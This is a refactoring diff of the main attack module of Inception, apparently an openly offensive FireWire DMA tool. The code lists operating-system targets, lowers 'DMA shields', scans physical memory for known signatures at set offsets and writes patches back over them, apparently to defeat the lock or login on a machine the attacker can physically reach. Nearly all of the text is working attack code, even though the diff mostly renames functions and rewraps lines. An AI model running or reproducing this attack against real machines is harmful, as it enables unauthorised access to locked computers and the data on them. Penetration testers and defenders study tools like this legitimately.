@@ -21,14 +21,13 @@ Created on Jun 23, 2011
 
 @author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
 '''
-from inception.firewire import FireWire
-from inception.util import msg, MemoryFile, fail, bytelen, \
-    int2binhex, separator, bytes2hexstr, warn
-import inception.settings as settings
+from inception import sound
+from inception.firewire import FireWire, cfg
+from inception.util import info, MemoryFile, fail, bytelen, int2binhex, \
+    separator, bytes2hexstr, warn
+import os
 import sys
 import time
-import os
-from inception import sound
 
 
 def select_target(targets, selected=False):
@@ -36,9 +35,10 @@ def select_target(targets, selected=False):
     Provides easy selection of targets. Input is a list of targets (dicts)
     '''
     if len(targets) == 1:
-        msg('Only one target present, auto-selected')
+        info('Only one target present, auto-selected')
         return targets[0]
-    if not selected: selected = input('[!] Please select target (or enter \'q\' to quit): ')
+    if not selected: selected = input('[!] Please select target (or enter ' +
+                                      '\'q\' to quit): ')
     nof_targets = len(targets)
     try:
         selected = int(selected)
@@ -50,18 +50,20 @@ def select_target(targets, selected=False):
     if 0 < selected <= nof_targets:
         return targets[selected - 1]
     else:
-        warn('Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit')
+        warn('Please enter a selection between 1 and ' + str(nof_targets) + 
+             '. Type \'q\' to quit')
         return select_target(targets)
     
 
-def printdetails(target): # TODO: Fix this method
+def printdetails(target): # TODO: Fix this fugly method
     '''
     Prints details about a target
     '''
-    msg('The target module contains the following signatures:')
+    info('The target module contains the following signatures:')
     separator()
     print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
-    print('\tArchitectures:\t' + ', '.join(target['architectures']).rstrip(', '))
+    print('\tArchitectures:\t' + ', '
+          .join(target['architectures']).rstrip(', '))
     for signature in target['signatures']:
         offsets = '\n\t\tOffsets:\t'
         for offset in signature['offsets']:
@@ -89,10 +91,10 @@ def printdetails(target): # TODO: Fix this method
     
     
 def list_targets(targets, details=False):
-    msg('Available targets:')
+    info('Available targets:')
     separator()
     for number, target in enumerate(targets, 1):
-                msg(target['OS'] + ': ' + target['name'], sign = number)
+                info(target['OS'] + ': ' + target['name'], sign = number)
                 if details:
                     printdetails(target)
     if not details: # Avoid duplicate separator
@@ -142,8 +144,8 @@ def patch(device, address, chunks):
         if patch:
             device.write(realaddress, patch)
             read = device.read(realaddress, len(patch))
-            if settings.verbose:
-                msg('Data read back: ' + bytes2hexstr(read))
+            if cfg.verbose:
+                info('Data read back: ' + bytes2hexstr(read))
             if  read != patch:
                 success = False
     return success
@@ -153,7 +155,7 @@ def searchanddestroy(device, target, memsize):
     '''
     Main search loop
     '''
-    pageaddress = settings.startaddress
+    pageaddress = cfg.startaddress
     signatures = target['signatures']
 
     # Add signature lengths in bytes to the dictionary, and replace integer
@@ -188,13 +190,13 @@ def searchanddestroy(device, target, memsize):
                 offset_len = len(offsets)
                 
                 for n in range(offset_len): # Iterate over offsets
-                    address = pageaddress + offsets[n] + settings.PAGESIZE * j
+                    address = pageaddress + offsets[n] + cfg.PAGESIZE * j
                     r.append((address, length))
                     p.append(chunks)
                     count += 1
                     # If we have built a full vector, read from memory and
                     # compare to the corresponding signatures
-                    if count == settings.vectorsize:
+                    if count == cfg.vectorsize:
                         # Read data from device
                         m = 0
                         for caddr, cand  in device.readv(r):
@@ -203,10 +205,10 @@ def searchanddestroy(device, target, memsize):
                                 return (caddr, p[m])
                             m += 1                    
                         # Jump to next pages (we're finished with these)
-                        mask = ~(settings.PAGESIZE - 0x01)
+                        mask = ~(cfg.PAGESIZE - 0x01)
                         pageaddress = address & mask
                         if sig_len == i and offset_len == n:
-                            pageaddress = pageaddress + settings.PAGESIZE
+                            pageaddress = pageaddress + cfg.PAGESIZE
                             
                         # Zero out counters and vectors
                         j = 0
@@ -215,10 +217,12 @@ def searchanddestroy(device, target, memsize):
                         p = []
                         
                         # Print status
-                        mibaddr = pageaddress // settings.MiB
-                        sys.stdout.write('[*] Searching, {0:>4d} MiB so far'.format(mibaddr))
-                        if settings.verbose:
-                            sys.stdout.write('. Sample data read: {0}'.format(bytes2hexstr(cand)[0:24]))
+                        mibaddr = pageaddress // cfg.MiB
+                        sys.stdout.write('[*] Searching, {0:>4d} MiB so far'
+                                         .format(mibaddr))
+                        if cfg.verbose:
+                            sys.stdout.write('. Sample data read: {0}'
+                                             .format(bytes2hexstr(cand)[0:24]))
                         sys.stdout.write('\r')
                         sys.stdout.flush()
                          
@@ -242,15 +246,16 @@ def attack(targets):
     Main attack logic
     '''
     # Initialize and lower DMA shield
-    if not settings.filemode:
+    if not cfg.filemode:
         try:
             fw = FireWire()
         except IOError:
-            fail('Could not initialize FireWire. Are the modules loaded into the kernel?')
+            fail('Could not initialize FireWire. Are the modules loaded into ' +
+                 'the kernel?')
         start = time.time()
         device_index = fw.select_device()
         # Print selection
-        msg('Selected device: {0}'.format(fw.vendors[device_index]))
+        info('Selected device: {0}'.format(fw.vendors[device_index]))
 
     # List targets
     list_targets(targets)
@@ -259,23 +264,24 @@ def attack(targets):
     target = select_target(targets)
     
     # Print selection. If verbose, print selection with signatures
-    msg('Selected target: ' + target['OS'] + ': ' + target['name'])
-    if settings.verbose:
+    info('Selected target: ' + target['OS'] + ': ' + target['name'])
+    if cfg.verbose:
         printdetails(target)
     
     # Lower DMA shield or use a file as input, and set memsize
     device = None
     memsize = None
-    if settings.filemode:
-        device = MemoryFile(settings.filename, settings.PAGESIZE)
-        memsize = os.path.getsize(settings.filename)
+    if cfg.filemode:
+        device = MemoryFile(cfg.filename, cfg.PAGESIZE)
+        memsize = os.path.getsize(cfg.filename)
     else:
         elapsed = int(time.time() - start)
         device = fw.getdevice(device_index, elapsed)
-        memsize = settings.memsize
+        memsize = cfg.memsize
     
-    # Perform parallel search for all signatures for each OS at the known offsets
-    msg('DMA shields should be down by now. Attacking...')
+    # Perform parallel search for all signatures for each OS at the known 
+    # offsets
+    info('DMA shields should be down by now. Attacking...')
     address, chunks = searchanddestroy(device, target, memsize)
     if not address:
         # TODO: Fall-back sequential search?
@@ -283,17 +289,18 @@ def attack(targets):
     
     # Signature found, let's patch
     mask = 0xfffff000 # Mask away the lower bits to find the page number
-    page = int((address & mask) / settings.PAGESIZE)
-    msg('Signature found at {0:#x} (in page # {1})'.format(address, page))
-    if not settings.dry_run:
+    page = int((address & mask) / cfg.PAGESIZE)
+    info('Signature found at {0:#x} (in page # {1})'.format(address, page))
+    if not cfg.dry_run:
         success = patch(device, address, chunks)
         if success:
-            msg('Write-back verified; patching successful')
-            if settings.egg:
+            info('Write-back verified; patching successful')
+            if cfg.egg:
                 sound.play('data/inception.wav')
-            msg('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
+            info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
         else:
-            warn('Write-back could not be verified; patching *may* have been unsuccessful')
+            warn('Write-back could not be verified; patching *may* have been ' +
+                 'unsuccessful')
     
     #Clean up
     device.close()
